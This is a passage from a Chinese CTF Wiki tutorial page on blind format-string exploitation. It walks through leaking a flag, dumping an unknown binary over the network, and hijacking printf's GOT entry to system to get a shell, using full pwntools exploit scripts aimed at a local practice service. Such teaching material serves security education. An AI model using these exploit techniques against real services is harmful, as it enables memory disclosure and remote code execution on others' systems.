+<h4 id="_34">利用<a class="headerlink" href="#_34" title="Permanent link">&para;</a></h4>
+<p>那我们就一点一点测试看看</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
+
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">):</span>
+        <span class="k">print</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%{}$p&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">leak</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</pre></div>
+
+<p>最后在输出中简单看了看，得到flag</p>
+<div class="codehilite"><pre><span></span>////////
+////////
+<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span>ff
+flag<span class="o">{</span>thi
+s_is_fla
+g<span class="o">}</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span>
+<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span>fe<span class="se">\x</span>7f<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span>
+</pre></div>
+
+<h3 id="2-got">例子2-盲打劫持got<a class="headerlink" href="#2-got" title="Permanent link">&para;</a></h3>
+<p>源码以及部署文件均已经在blind_fmt_got文件夹中。</p>
+<h4 id="_35">确定程序位数<a class="headerlink" href="#_35" title="Permanent link">&para;</a></h4>
+<p>通过简单地测试，我们发现这个程序是格式化字符串漏洞函数，并且程序为64位。</p>
+<div class="codehilite"><pre><span></span>➜  blind_fmt_got git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
+%p
+0x7fff3b9774c0
+</pre></div>
+
+<p>这次啥也没有回显，又试了试，发现也没啥情况，那我们就只好来泄露一波源程序了。</p>
+<h4 id="_36">确定偏移<a class="headerlink" href="#_36" title="Permanent link">&para;</a></h4>
+<p>在泄露程序之前，我们还是得确定一下格式化字符串的偏移，如下</p>
+<div class="codehilite"><pre><span></span>➜  blind_fmt_got git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
+aaaaaaaa%p%p%p%p%p%p%p%p%p
+aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
+</pre></div>
+
+<p>据此，我们可以知道格式化字符串的起始地址偏移为6。</p>
+<h4 id="binary">泄露binary<a class="headerlink" href="#binary" title="Permanent link">&para;</a></h4>
+<p>由于程序是64位，所以我们从0x400000处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入'\x00'字符的，，不然没法泄露怎么玩，，除此之后，输出必然是'\x00'截断的，这是因为格式化字符串漏洞利用的输出函数均是'\x00'截断的。。所以我们可以利用如下的泄露代码。</p>
+<div class="codehilite"><pre><span></span><span class="c1">##coding=utf8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="c1"># leak addr for three times</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s1">&#39;leak addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+            <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%00008$s&#39;</span> <span class="o">+</span> <span class="s1">&#39;STARTEND&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+            <span class="c1"># 说明有\n，出现新的一行</span>
+            <span class="k">if</span> <span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+                <span class="k">return</span> <span class="bp">None</span>
+            <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;STARTEND&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="n">data</span>
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+            <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">continue</span>
+    <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">getbinary</span><span class="p">():</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;binary&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x401000</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">getbinary</span><span class="p">()</span>
+</pre></div>
+
+<p>需要注意的是，在payload中需要判断是否有'\n'出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。</p>
+<h4 id="binary_1">分析binary<a class="headerlink" href="#binary_1" title="Permanent link">&para;</a></h4>
+<p>利用ida打开泄露的binary，改变程序基地址，然后简单看看，可以基本确定源程序main函数的地址</p>
+<div class="codehilite"><pre><span></span><span class="nl">seg000:</span><span class="err">00000000004005</span><span class="nf">F6</span>                 <span class="no">push</span>    <span class="no">rbp</span>
+<span class="nl">seg000:</span><span class="err">00000000004005</span><span class="nf">F7</span>                 <span class="no">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
+<span class="nl">seg000:</span><span class="err">00000000004005</span><span class="nf">FA</span>                 <span class="no">add</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">0</span><span class="no">FFFFFFFFFFFFFF80h</span>
+<span class="nl">seg000:</span><span class="err">00000000004005</span><span class="nf">FE</span>
+<span class="nl">seg000:</span><span class="err">00000000004005</span><span class="nf">FE</span> <span class="no">loc_4005FE</span><span class="p">:</span>                             <span class="c">; CODE XREF: seg000:0000000000400639j</span>
+<span class="no">seg000</span><span class="p">:</span><span class="mi">00000000004005</span><span class="no">FE</span>                 <span class="no">lea</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp-80h</span><span class="p">]</span>
+<span class="nl">seg000:</span><span class="err">0000000000400602</span>                 <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="mi">80</span><span class="no">h</span> <span class="c">; &#39;€&#39;</span>
+<span class="no">seg000</span><span class="p">:</span><span class="mi">0000000000400607</span>                 <span class="no">mov</span>     <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nl">seg000:</span><span class="err">000000000040060</span><span class="nf">A</span>                 <span class="no">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">0</span>
+<span class="nl">seg000:</span><span class="err">000000000040060</span><span class="nf">F</span>                 <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
+<span class="nl">seg000:</span><span class="err">0000000000400614</span>                 <span class="nf">call</span>    <span class="no">sub_4004C0</span>
+<span class="nl">seg000:</span><span class="err">0000000000400619</span>                 <span class="nf">lea</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp-80h</span><span class="p">]</span>
+<span class="nl">seg000:</span><span class="err">000000000040061</span><span class="nf">D</span>                 <span class="no">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nl">seg000:</span><span class="err">0000000000400620</span>                 <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
+<span class="nl">seg000:</span><span class="err">0000000000400625</span>                 <span class="nf">call</span>    <span class="no">sub_4004B0</span>
+<span class="nl">seg000:</span><span class="err">000000000040062</span><span class="nf">A</span>                 <span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">cs</span><span class="p">:</span><span class="mi">601048</span><span class="no">h</span>
+<span class="nl">seg000:</span><span class="err">0000000000400631</span>                 <span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nl">seg000:</span><span class="err">0000000000400634</span>                 <span class="nf">call</span>    <span class="no">near</span> <span class="no">ptr</span> <span class="no">unk_4004E0</span>
+<span class="nl">seg000:</span><span class="err">0000000000400639</span>                 <span class="nf">jmp</span>     <span class="no">short</span> <span class="no">loc_4005FE</span>
+</pre></div>
+
+<p>可以基本确定的是sub_4004C0为read函数，因为读入函数一共有三个参数的话，基本就是read了。此外，下面调用的sub_4004B0应该就是输出函数了，再之后应该又调用了一个函数，此后又重新跳到读入函数处，那程序应该是一个while 1的循环，一直在执行。</p>
+<h4 id="_37">利用思路<a class="headerlink" href="#_37" title="Permanent link">&para;</a></h4>
+<p>分析完上面的之后，我们可以确定如下基本思路</p>
+<ul>
+<li>泄露printf函数的地址，</li>
+<li>获取对应libc以及system函数地址</li>
+<li>修改printf地址为system函数地址</li>
+<li>读入/bin/sh;以便于获取shell</li>
+</ul>
+<h4 id="_38">利用程序<a class="headerlink" href="#_38" title="Permanent link">&para;</a></h4>
+<p>程序如下。</p>
+<div class="codehilite"><pre><span></span><span class="c1">##coding=utf8</span>
+<span class="kn">import</span> <span class="nn">math</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="c1"># leak addr for three times</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s1">&#39;leak addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+            <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%00008$s&#39;</span> <span class="o">+</span> <span class="s1">&#39;STARTEND&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+            <span class="c1"># 说明有\n，出现新的一行</span>
+            <span class="k">if</span> <span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+                <span class="k">return</span> <span class="bp">None</span>
+            <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;STARTEND&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="n">data</span>
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+            <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">continue</span>
+    <span class="k">return</span> <span class="bp">None</span>
+
+
+<span class="k">def</span> <span class="nf">getbinary</span><span class="p">():</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;binary&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x401000</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+
+<span class="c1">##getbinary()</span>
+<span class="n">read_got</span> <span class="o">=</span> <span class="mh">0x601020</span>
+<span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="c1">## let the read get resolved</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="c1">## get printf addr</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%00008$s&#39;</span> <span class="o">+</span> <span class="s1">&#39;STARTEND&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;STARTEND&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">read_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="c1">## get system addr</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="n">read_addr</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">read_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;read   addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">read_addr</span><span class="p">))</span>
+<span class="c1">## modify printf_got</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
+<span class="c1">## get all the addr</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%32d</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">[</span><span class="mi">32</span><span class="p">:]</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
+    <span class="n">old</span> <span class="o">=</span> <span class="s1">&#39;%{}$&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">new</span> <span class="o">=</span> <span class="s1">&#39;%{}$&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">old</span><span class="p">,</span> <span class="n">new</span><span class="p">)</span>
+<span class="n">remainer</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">remainer</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">addr</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+
+<span class="c1">## get shell</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<p>这里需要注意的是这一段代码</p>
+<div class="codehilite"><pre><span></span><span class="c1">## modify printf_got</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
+<span class="c1">## get all the addr</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%32d</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">[</span><span class="mi">32</span><span class="p">:]</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
+    <span class="n">old</span> <span class="o">=</span> <span class="s1">&#39;%{}$&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">new</span> <span class="o">=</span> <span class="s1">&#39;%{}$&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">old</span><span class="p">,</span> <span class="n">new</span><span class="p">)</span>
+<span class="n">remainer</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">remainer</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">addr</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</pre></div>
+
+<p>fmtstr_payload直接得到的payload会将地址放在前面，而这个会导致printf的时候'\x00'截断（<strong>关于这一问题，pwntools目前正在开发fmt_payload的加强版，估计快开发出来了。</strong>）。所以我使用了一些技巧将它放在后面了。主要的思想是，将地址放在后面8字节对齐的地方，并对payload中的偏移进行修改。需要注意的是</p>
+<div class="codehilite"><pre><span></span><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</pre></div>
+
+<p>这一行给出了修改后的地址在格式化字符串中的偏移，之所以是这样在于无论如何修改，由于'%order$hn'中order多出来的字符都不会大于8。具体的可以自行推导。</p>
+                
+                  
+                
+              
+              
+                
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                格式化字符串漏洞利用
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../fmtstr_detect/" title="格式化字符串漏洞检测" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                格式化字符串漏洞检测
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2016 - 2018 CTF Wiki Team
+          </div>
+        
+        powered by
+        <a href="http://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.abd7b172.js"></script>
+      
+        
+        
+          
+          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../assets/javascripts/lunr/lunr.jp.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"0.17.2",url:{base:"../../.."}})</script>
+      
+        <script src="../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
